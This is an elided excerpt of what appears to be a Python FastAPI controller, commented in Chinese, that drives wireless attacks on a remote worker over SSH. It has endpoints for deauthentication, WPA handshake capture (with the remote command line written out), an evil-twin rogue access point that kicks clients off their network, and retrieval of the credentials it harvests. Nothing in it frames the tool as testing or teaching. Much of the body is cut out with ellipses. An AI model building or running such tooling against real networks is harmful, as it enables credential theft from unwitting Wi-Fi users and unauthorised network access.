...
async def start_deauth_attack(req: AttackRequest):
    ...
    if not local_path:
        raise HTTPException(500, f"缺失 {script_name}")
...
async def start_handshake_capture(req: AttackRequest):
    ...
    # 同步执行，等待 worker 返回结果 (get_pty=True 确保能拿到实时输出)
    cmd = f"python3 {remote_path} handshake --bssid {req.bssid} --interface {req.interface} --channel {req.channel} --duration {req.duration}"

    try:
        # 使用较大的 timeout，因为抓包需要时间
        stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=req.duration + 30, get_pty=True)
        ...
        if "CAPTURED_HS_POTENTIAL" in output:
            ...
            # 检查远程文件是否存在
            check_res = ssh_client.exec_command(f"ls {remote_cap}")[1].read()
            if check_res:
            ...
            if not file_found:
                response_data["msg"] = "检测到握手包但下载文件失败"
...
async def start_evil_twin(req: AttackRequest):
    ...
    if req.interface == req.ap_interface:
        raise HTTPException(400, "错误：攻击网卡和 AP 网卡不能是同一个！请使用双网卡。")
    ...
    try:
        ...
        # 4. 启动 Deauth 攻击 (输出到 et_deauth.log)
        ...
        return {
            "status": "started",
            "msg": "双子攻击已启动！AP 已建立，Deauth 正在踢人。",
            "details": {
...
async def stop_evil_twin():
    ...
    try:
        ...
        return {"status": "success", "msg": "Evil Twin 攻击已停止。"}
    except Exception as e:
        return {"status": "error", "msg": str(e)}
...
async def get_credentials():
    ...
    try:
        ...
        creds = [line.strip() for line in data.splitlines() if line.strip()]
...
async def get_eviltwin_logs():
    ...
    try:
        ...
        output = stdout.read().decode()
        logs = [line.strip() for line in output.splitlines() if line.strip() and line.strip() != "---"]
